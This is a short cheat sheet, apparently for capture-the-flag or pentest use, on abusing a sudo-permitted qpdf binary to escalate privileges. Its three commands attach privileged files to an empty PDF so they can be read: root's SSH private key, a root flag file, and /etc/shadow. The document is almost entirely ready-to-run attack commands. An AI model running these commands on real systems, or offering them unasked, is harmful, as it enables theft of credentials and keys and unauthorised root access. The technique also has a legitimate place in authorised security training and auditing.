# Qpdf privilege escalation

## Sudo

### Usage:

#### 1) Get root ssh private key

    sudo /usr/bin/qpdf --qdf --add-attachment /root/.ssh/id_rsa -- --empty ./id_rsa 

#### 2) Get root flag

    sudo /usr/bin/qpdf --qdf --add-attachment /root/flag.txt -- --empty ./flag.txt 

#### 3) Get shadow file

    sudo /usr/bin/qpdf --qdf --add-attachment /etc/shadow -- --empty ./shadow 



